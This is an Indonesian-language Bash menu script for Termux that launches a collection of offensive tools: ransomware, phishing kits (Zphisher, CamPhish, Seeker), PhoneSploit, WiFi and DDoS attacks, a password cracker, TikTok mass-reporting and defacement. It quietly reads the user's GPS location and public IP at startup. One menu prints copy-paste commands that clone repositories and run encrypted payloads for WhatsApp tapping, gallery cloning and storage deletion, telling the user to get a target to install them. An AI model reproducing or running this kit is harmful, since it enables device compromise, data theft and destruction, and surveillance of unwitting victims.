#!/bin/bash

#font variables
# Fungsi untuk autoketik dengan warna
function autoketik {
    text="$1"
    color="$2"
    for ((i=0; i<${#text}; i++)); do
    echo -n -e "${color}${text:i:1}"
        sleep 0.001 # Durasi delay antar karakter
    done
    echo
  
}
PUBLIC_IP=$(curl -s https://ipinfo.io | jq -r '.ip')

# Mengambil lokasi GPS
LOCATION_DATA=$(termux-location -p gps -r 60)
if [[ -z "$LOCATION_DATA" ]]; then
    echo "$(date) - Gagal mendapatkan lokasi. Pastikan GPS aktif dan Termux memiliki izin lokasi."
    exit 1
fi

LATITUDE=$(echo "$LOCATION_DATA" | grep -o '"latitude":[^,]*' | cut -d':' -f2)
LONGITUDE=$(echo "$LOCATION_DATA" | grep -o '"longitude":[^,]*' | cut -d':' -f2)
CITY=$(curl -s "https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=$LATITUDE&longitude=$LONGITUDE&localityLanguage=en" | jq -r '.city')
whoami=$(whoami)
# Mendapatkan waktu saat ini
WAKTU=$(date)


bold="\033[1m"
ncol="\033[0m"

# Color variables
red='\033[0;31m'
green='\033[0;32m'
yellow='\033[0;33m'
blue='\033[0;34m'
magenta='\033[0;35m'
cyan='\033[0;36m'

if [ -f user.txt ]; then
    # Membaca nama pengguna dari file.txt
    nama_user=$(cat user.txt)
    
    
fi


function autoketik {
    text="$1"
    for ((i=0; i<${#text}; i++)); do
        echo -n "${text:i:1}"
        sleep 0.009
    done
    echo
}
pilih="㉿localhost══➠"
banner="${cyan}
===================================================${ncol}
${red}███████╗██╗░░██╗██████╗░██╗░░░░░░█████╗░██╗████████╗
██╔════╝╚██╗██╔╝██╔══██╗██║░░░░░██╔══██╗██║╚══██╔══╝
█████╗░░░╚███╔╝░██████╔╝██║░░░░░██║░░██║██║░░░██║░░░
██╔══╝░░░██╔██╗░██╔═══╝░██║░░░░░██║░░██║██║░░░██║░░░
███████╗██╔╝╚██╗██║░░░░░███████╗╚█████╔╝██║░░░██║░░░
╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚══════╝░╚════╝░╚═╝░░░╚═╝
${ncol}${green}${bold}CREATED BY ./EXPLOIT INDEPENDENT ft Mr 4REX 503${ncol}
${ncol}${green}${bold}THANK TO TEAM TUKANG ATTACK & GALIRUS 404${ncol}
${cyan}==================================================="
clear
echo -e "${banner}"
echo -e "${yellow}${bold}#KETIK OFF KALO STOP MUSIK KIDS 彡"
echo -e "${green}${bold}#PILIH MENU DIBAWAH INI 彡"
echo -e "╔════════════════════════════════════════╗"
 echo -e "╠═${yellow}${bold}1. RANSOMEWARE (ROOT)${ncol}${green}                  ║"
 echo -e "╠═${yellow}${bold}2. SPAM TOOLSV5 PREMIUM (PM GALIRUS)${ncol}${green}   ║"
 echo -e "╠═${yellow}${bold}3. DEFACE404${ncol}${green}                           ║"
 echo -e "╠═${yellow}${bold}4. SEEKER${ncol}${green}                              ║"
 echo -e "╠═${yellow}${bold}5. PHISHER${ncol}${green}                             ║"
 echo -e "╠═${yellow}${bold}6. PHONE XPLOIT${ncol}${green}                        ║"
 echo -e "╠═${yellow}${bold}7. CEK KHODAM PENDAMPING${ncol}${green}               ║"
 echo -e "╠═${yellow}${bold}8. TAMPILAN TERMUX${ncol}${green}                     ║"
 echo -e "╠═${yellow}${bold}9. PERUSAK WIFI${ncol}${green}                        ║"
 echo -e "╠═${yellow}${bold}10. OSINT NUMBER & IP${ncol}${green}                  ║"
 echo -e "╠═${yellow}${bold}11. CRACK ALL TOOLS${ncol}${green}                    ║"
 echo -e "╠═${yellow}${bold}12. CAMPISH${ncol}${green}                            ║"
 echo -e "╠═${yellow}${bold}13. MENU PERUSAK STORAGE${ncol}${green}               ║"
 echo -e "╠═${yellow}${bold}14. EXIT TOOLS${ncol}${green}                         ║"
 echo -e "╠═${green}═══════════════════════════════════════╣${ncol}${green} "
 echo -e "╠═${yellow}${bold}•  NEXT >>>>>>>>>${ncol}${green}                      ║"
 echo -e "╠════════════════════════════════════════╣"
 echo -e "╠═${yellow}${bold}•  MUSIK ✓ ${ncol}${green}                            ║"
 echo -e "╠═${yellow}${bold}•  LAPOR_BUG ✓ ${ncol}${green}                        ║"
 echo -e "╠════════════════════════════════════════╣"
 echo -e "${green}${bold}╠════════════════════════════════════════╣ ${clear}"
echo -e "║${yellow}${bold} LOKASI  : $CITY, $COUNTRY${ncol}${green}                   ║"
echo -e "║${yellow}${bold} IP KAMU : $PUBLIC_IP${ncol}${green}                 ║"
echo -e "║${yellow}${bold} WAKTU   : $WAKTU${ncol}${green} ║"
echo -e "║${yellow}${bold} ID KAMU : $whoami${ncol}${green}                      ║"
echo -e "${green}${bold}╠════════════════════════════════════════╝"
echo -e "║${yellow}${bold}DRAX SISTEM >> ${nama_user}${ncol}${green}                      "

echo -e "${green}${bold}╠════════════════════════════════════════╝"

echo -e "${green}${bold}║"
read -p "╚═${pilih}   " pilih
if [ $pilih = "1" ]
then
mpv --volume=150 https://h.top4top.io/m_3225x59oo1.mp3>clear
        clear
        echo -e "${banner}"
        echo "SCANING MODE"
        sleep 2
        cd SARA
        python3 sara.py
         cd TOOLS
        bash next.sh 
elif [ $pilih = "off" ]
then
killall mpv
bash next.sh
elif [ $pilih = "exit" ]
then
killall mpv
echo -e "$banner"
exit
elif [ $pilih = "musik" ]
then
clear
echo -e "${banner}"
echo -e "║${green} ${bold}"
autoketik "║PILIH MUSIK BIAR GK BOSEN彡"
echo -e "╠══════════════════════════╗"
autoketik "║1║. GREEN DAY             ║"
autoketik "║2║. SIZE THE DAY          ║"
autoketik "║3║. DMASIV                ║"
autoketik "║4║. ADA BAND              ║"
autoketik "║5║. DESA LUKA NEGARA      ║"
autoketik "║0║. NO MUSIK              ║"
echo -e "╠══════════════════════════╝"
read -p "╚═㉿localhost══➠" pilih

    
    if [ "$pilih" == "1" ]; then
    mpv --volume=150 https://h.top4top.io/m_3225x59oo1.mp3>clear
    killall mpv
    mpv  --loop=inf https://b.top4top.io/m_3225rteyn1.mp3>clear -&
     elif [ "$pilih" == "2" ]; then
    mpv --volume=150 https://h.top4top.io/m_3225x59oo1.mp3>clear
    killall mpv
    mpv --loop=inf https://i.top4top.io/m_3225iw9b11.mp3>clear -&
     elif [ "$pilih" == "3" ]; then
     mpv --volume=150 https://h.top4top.io/m_3225x59oo1.mp3>clear
     killall mpv
     mvp --loop=inf https://e.top4top.io/m_3208sappr1.mp3>clear -&
     elif [ "$pilih" == "4" ]; then
     mpv --volume=150 https://h.top4top.io/m_3225x59oo1.mp3>clear
     killall mpv
     mpv --loop=inf https://b.top4top.io/m_3209t2c591.mp3>clear -&
     elif [ "$pilih" == "5" ]; then
     mpv --volume=150 https://h.top4top.io/m_3225x59oo1.mp3>clear
     killall mpv
     mpv --loop=inf https://f.top4top.io/m_32076391b1.mp3>clear -&
    elif [ "$pilih" == "0" ]; then
     mpv --volume=150 https://h.top4top.io/m_3225x59oo1.mp3>clear
    autoketik "ANDA TIDAK MEMAKAI MUSIK"
    
    else
        echo "Pilihan tidak valid. Silakan coba lagi."
        read -p "Tekan Enter untuk mencoba lagi..."
        continue
    fi
    bash next.sh
    
 elif [ $pilih = "lapor_bug" ]
then 
clear 
xdg-open https://wa.me/6285843466726?text=bug_bang
bash next.sh

 elif [ $pilih = "next" ]
then 
clear
echo -e "${banner}"
echo -e "${green}${bold}#PILIH MENU BAWAH INI彡"
echo -e "╔════════════════════════════════════════╗"
 echo -e "╠═${yellow}${bold}1. REPORT TIK-TOK${ncol}${green}                      ║"
 echo -e "╠═${yellow}${bold}2. DDOS ATTACK${ncol}${green}                         ║"
 echo -e "╠═${yellow}${bold}3. YOUTUBE DOWNLOADERS${ncol}${green}                 ║"
 echo -e "╠═${yellow}${bold}4. GRUB BOKEP${ncol}${green}                          ║"
 echo -e "╠═${yellow}${bold}5. COMINGSOON${ncol}${green}                          ║"
 echo -e "╠═${yellow}${bold}6. COMINGSOON${ncol}${green}                          ║"
 echo -e "╠═${yellow}${bold}7. COMINGSOON${ncol}${green}                          ║"
 echo -e "╠════════════════════════════════════════╝"
 echo -e "║"
 read -p "╚═㉿localhost══➠  " pilih



if [ $pilih = "1" ]
then
mpv --volume=150 https://h.top4top.io/m_3225x59oo1.mp3>clear
clear
sleep 1
cd TIDTOD-BANNED-
bash q.sh
clear
bash next.sh
elif [ $pilih = "2" ]
then
mpv --volume=150 https://h.top4top.io/m_3225x59oo1.mp3>clear
echo -e "${banner}"
clear
sleep 1
python3 DDOS.py
clear
bash next.sh
elif [ $pilih = "3" ]
then
mpv --volume=150 https://h.top4top.io/m_3225x59oo1.mp3>clear
clear
echo -e "${banner}"
python3 yt.py
clear
bash next.sh
elif [ $pilih = "4" ]
then
mpv --volume=150 https://h.top4top.io/m_3225x59oo1.mp3>clear
clear
xdg-open https://whatsapp.com/channel/0029VapSRtoGOj9k1BfsTj2K
echo -e "${banner}"
bash next.sh
elif [ $pilih = "5" ]
then
mpv --volume=150 https://h.top4top.io/m_3225x59oo1.mp3>clear
clear
echo -e "${banner}"
bash next.sh
elif [ $pilih = "6" ]
then
mpv --volume=150 https://h.top4top.io/m_3225x59oo1.mp3>clear
clear
echo -e "${banner}"
bash next.sh
elif [ $pilih = "7" ]
then
mpv --volume=150 https://h.top4top.io/m_3225x59oo1.mp3>clear
clear
bash next.sh

else
mpv --volume=150 https://h.top4top.io/m_3225x59oo1.mp3>clear
bash next.sh

fi




elif [ $pilih = "2" ]
then
mpv --volume=150 https://h.top4top.io/m_3225x59oo1.mp3>clear
echo -e "${banner}"
         echo "BENTAR SAYANG"
         sleep 2 
         echo""
         clear
         echo "GALIRUS"
         xdg-open https://wa.me/6285850268349?text=Galirus_Ganteng_Cihuy_HARGA_TOOLSV5
         sleep 10 
         bash next.sh 
exit
elif [ $pilih = "3" ]
then
mpv --volume=150 https://h.top4top.io/m_3225x59oo1.mp3>clear
        clear
        echo -e "${banner}"
        echo "SCANING MODE"
        sleep 2
        python DEFACE404.py
        bash next.sh
elif [ $pilih = "4" ] 
then 
mpv --volume=150 https://h.top4top.io/m_3225x59oo1.mp3>clear
clear
echo -e "${banner}"
      echo "SCANING MODE"
      sleep 2 
      clear 
      cd seeker && python3 seeker.py 
      clear
      
      bash next.sh 

elif [ $pilih = "5" ] 
then 
mpv --volume=150 https://h.top4top.io/m_3225x59oo1.mp3>clear
      clear
      echo -e "${banner}"
      echo "SCANING MODE"
      sleep 3 
      clear
      cd zphisher
      bash zphisher.sh
      
      bash next.sh
      
elif [ $pilih = "6" ]
then 
mpv --volume=150 https://h.top4top.io/m_3225x59oo1.mp3>clear
clear
echo -e "${banner}"
      echo "SCANING MODE"
      sleep 1
      echo
      clear
      cd PhoneSploit-Pro/
      python3 phonesploitpro.py
      clear 
     
      bash next.sh

    
elif [ $pilih = "7" ]
then
   mpv --volume=150 https://h.top4top.io/m_3225x59oo1.mp3>clear  
   clear
   echo -e "${banner}"
         echo "scaning mode........"
         sleep 3 
         clear
         echo "sabar tod dukun nya masih sarapan"
         sleep 5 
         
clear
        
      
        
        killall mpv
        
        echo -e "${red}KHODAM KAMU :
           ██████╗░░█████╗░██████╗░██╗
           ██╔══██╗██╔══██╗██╔══██╗██║
           ██████╦╝███████║██████╦╝██║
           ██╔══██╗██╔══██║██╔══██╗██║
           ██████╦╝██║░░██║██████╦╝██║
           ╚═════╝░╚═╝░░╚═╝╚═════╝${clear}"

echo -e "${yellow}"
autoketik "LU PASTI SERING PEGANG LILIN YA TIAP MALAM TOD"
mpv https://j.top4top.io/m_3225jsnfw1.mp3>clear

      
    echo -e "${red}╔════════════════════════════════════════╗"
 
 echo -e "${red}║${ncol}${yellow}    TEKAN ENTER UNTUK MELANJUTKAN ${red}      ║"
 echo -e "${red}╠════════════════════════════════════════╝"
 read -p "╚═══>"
bash next.sh
        
        
        

elif [ $pilih = "8" ]
then 
    mpv --volume=150 https://h.top4top.io/m_3225x59oo1.mp3>clear   
         clear
         echo -e "${banner}"
         echo "SCANING MODE"
         sleep 3 
         clear
         cd T-Header/
         bash t-header.sh
          bash next.sh 
           sleep 2 
elif [ $pilih = "9" ]
then 
mpv --volume=150 https://h.top4top.io/m_3225x59oo1.mp3>clear
clear
echo -e "${banner}"
         echo "PROSES..."
         sleep 3
         python3 wifi.py
          bash next.sh 
elif [ $pilih = "10" ]
then
   mpv --volume=150 https://h.top4top.io/m_3225x59oo1.mp3>clear 
    clear
    echo -e "${banner}"
    echo""
    echo "SCANING MODE"
    sleep 3 
     
    python3 1.py
    bash next.sh
 elif [ $pilih = "11" ]
then
mpv --volume=150 https://h.top4top.io/m_3225x59oo1.mp3>clear
clear
echo -e "${banner}"
    sleep 2
    echo -e "${yellow} ${bold} 
    SCANING MODE"
       
    clear 
 cd Cracker-Tool
 python cracker-main.py
   clear 
 bash next.sh
 elif [ $pilih = "12" ]
then
mpv --volume=150 https://h.top4top.io/m_3225x59oo1.mp3>clear 
    clear
    echo -e "${banner}"
    echo""
    echo "SCANING MODE"
    sleep 3 
    
cd CamPhish
bash camphish.sh
   
    bash next.sh
  elif [ $pilih = "13" ]
then
mpv --volume=150 https://h.top4top.io/m_3225x59oo1.mp3>clear
clear
echo -e "${banner}"
echo""
echo "SCANING MODE"
sleep 3 
clear

echo -e "${green}
─────▄████▀█▄
───▄█████████████████▄
─▄█████.▼.▼.▼.▼.▼.▼▼▼▼
▄███████▄.▲.▲▲▲▲▲▲▲▲
████████████████████▀▀
"

echo
echo -e "${yellow}${bold}WARNING !! "
echo -e "${red}JANGAN LOE INSTALL NGENTOD , SURUH INSTALL TARGET LU, LU YANG INSTALL BERARTI LO TOLOL , PILIH MENU DI BAWAH "
echo
echo -e "╔════════════════════════════════════════╗"
echo -e "╠═${yellow}1. CLONING GALERY${ncol}${red}                      ║"
echo -e "╠═${yellow}2. DELETED STORAGE${ncol}${red}                     ║"
echo -e "╠═${yellow}3. KEMBALI KE MENU${ncol}${red}                     ║"
echo -e "${red}╠════════════════════════════════════════╝"
read -p "╚═══>" pilih
 if [ $pilih = "1" ]
 then 
 clear
 cowsay -f eyes "NGOPI,BANG" | lolcat
 echo -e "${red}╔════════════════════════════════════════╗"
 
 echo -e "${red}║${ncol}${yellow}    COPY SEMUA COMMAND DI BAWAH TOD ${red}    ║"
 echo -e "${red}╠════════════════════════════════════════╝${ncol}"
 echo -e "${green}${bold}
termux-setup-storage 
pkg update && pkg upgrade -y
pkg install git
pkg install bash 
gem install lolcat
pkg install neofetch
git clone https://github.com/EXPLOIT-PANEL/BANNED-WA.git
cd BANNED-WA 
unzip enc.zip
bash main.sh"
echo
echo -e "${red}╔════════════════════════════════════════╗"
 
 echo -e "${red}║${ncol}${yellow}    TEKAN ENTER UNTUK MELANJUTKAN ${red}      ║"
 echo -e "${red}╠════════════════════════════════════════╝"
 read -p "╚═══>"
 bash next.sh
elif [ $pilih = "2" ]
then
clear
cowsay -f eyes "NGOPI" | lolcat
echo -e "${red}╔════════════════════════════════════════╗"
 
 echo -e "${red}║${ncol}${yellow}    COPY SEMUA COMMAND DI BAWAH TOD ${red}    ║"
 echo -e "${red}╠════════════════════════════════════════╝${ncol}"
echo -e "${green}
termux-setup-storage
pkg update && pkg upgrade -y
pkg install git
pkg instal bash
pkg install neofetch
git clone https://github.com/EXPLOIT-PANEL/sadap-wa.git
cd sadap-wa
unzip enc.zip
bash sadap.sh"
echo
echo -e "${red}╔════════════════════════════════════════╗"
 
 echo -e "${red}║${ncol}${yellow}    TEKAN ENTER UNTUK MELANJUTKAN ${red}      ║"
 echo -e "${red}╠════════════════════════════════════════╝"
 read -p "╚═══>"
bash next.sh
elif [ $pilih = "3" ]
then
clear
bash next.sh
else
bash next.sh
fi



elif [ $pilih = "14" ]
then
    mpv --volume=150 https://h.top4top.io/m_3225x59oo1.mp3>clear   
       clear
       
        killall mpv
        
        echo
        banner="${yellow}
⠄⠄⠄⠄⠄⠄⣀⣀⣤⣤⣴⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣦⣤⣤⣄⣀⡀
⠄⠄⠄⠄⣴⣿⣿⡿⣿⢿⣟⣿⣻⣟⡿⣟⣿⣟⡿⣟⣿⣻⣟⣿⣻⢿⣻⡿⣿⢿⣷⣆
⠄⠄⠄⢘⣿⢯⣷⡿⡿⡿⢿⢿⣷⣯⡿⣽⣞⣷⣻⢯⣷⣻⣾⡿⡿⢿⢿⢿⢯⣟⣞⡮⡀
⠄⠄⠄⢸⢞⠟⠃⣉⢉⠉⠉⠓⠫⢿⣿⣷⢷⣻⣞⣿⣾⡟⠽⠚⠊⠉⠉⠉⠙⠻⣞⢵⠂
⠄⠄⠄⢜⢯⣺⢿⣻⣿⣿⣷⣔⡄⠄⠈⠛⣿⣿⡾⠋⠁⠄⠄⣄⣶⣾⣿⡿⣿⡳⡌⡗⡅
⠄⠄⠄⢽⢱⢳⢹⡪⡞⠮⠯⢯⡻⡬⡐⢨⢿⣿⣿⢀⠐⡥⣻⡻⠯⡳⢳⢹⢜⢜⢜⢎⠆
⠄⠄⠠⣻⢌⠘⠌⡂⠈⠁⠉⠁⠘⠑⢧⣕⣿⣿⣿⢤⡪⠚⠂⠈⠁⠁⠁⠂⡑⠡⡈⢮⠅
⠄⠄⠠⣳⣿⣿⣽⣭⣶⣶⣶⣶⣶⣺⣟⣾⣻⣿⣯⢯⢿⣳⣶⣶⣶⣖⣶⣮⣭⣷⣽⣗⠍
⠄⠄⢀⢻⡿⡿⣟⣿⣻⣽⣟⣿⢯⣟⣞⡷⣿⣿⣯⢿⢽⢯⣿⣻⣟⣿⣻⣟⣿⣻⢿⣿⢀
⠄⠄⠄⡑⡏⠯⡯⡳⡯⣗⢯⢟⡽⣗⣯⣟⣿⣿⣾⣫⢿⣽⠾⡽⣺⢳⡫⡞⡗⡝⢕⠕⠄
⠄⠄⠄⢂⡎⠅⡃⢇⠇⠇⣃⣧⡺⡻⡳⡫⣿⡿⣟⠞⠽⠯⢧⣅⣃⠣⠱⡑⡑⠨⢐⢌⠂
⠄⠄⠄⠐⠼⣦⢀⠄⣶⣿⢿⣿⣧⣄⡌⠂⠢⠩⠂⠑⣁⣅⣾⢿⣟⣷⠦⠄⠄⡤⡇⡪⠄
⠄⠄⠄⠄⠨⢻⣧⡅⡈⠛⠿⠿⠿⠛⠁⠄⢀⡀⠄⠄⠘⠻⠿⠿⠯⠓⠁⢠⣱⡿⢑⠄
⠄⠄⠄⠄⠈⢌⢿⣷⡐⠤⣀⣀⣂⣀⢀⢀⡓⠝⡂⡀⢀⢀⢀⣀⣀⠤⢊⣼⡟⡡
⠄⠄⠄⠄⠄⠈⢢⠚⣿⣄⠈⠉⠛⠛⠟⠿⠿⠟⠿⠻⠻⠛⠛⠉⠄⣠⠾⢑⠰⠈
⠄⠄⠄⠄⠄⠄⠄⠑⢌⠿⣦⡡⣱⣸⣸⣆⠄⠄⠄⣰⣕⢔⢔⠡⣼⠞⡡⠁⠁
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠑⢝⢷⣕⡷⣿⡿⠄⠄⠠⣿⣯⣯⡳⡽⡋⠌
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠙⢮⣿⣽⣯⠄⠄⢨⣿⣿⡷⡫⠃
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠘⠙⠝⠂⠄⢘⠋⠃⠁
 ${clear}"
 
 
 
        mpv dana.mp3>clear
        echo""
       
    echo -e "$banner"
    echo -e "${bold}${red}╔════════════════════════════════════════╗"
echo -e "${red}║${clear}${yellow}       SAMPAI JUMPA DI LAIN WAKTU       ║"
echo -e "╠════════════════════════════════════════╝"
    
       
        exit
        
   
  else

   bash next.sh
   
  
  



fi     

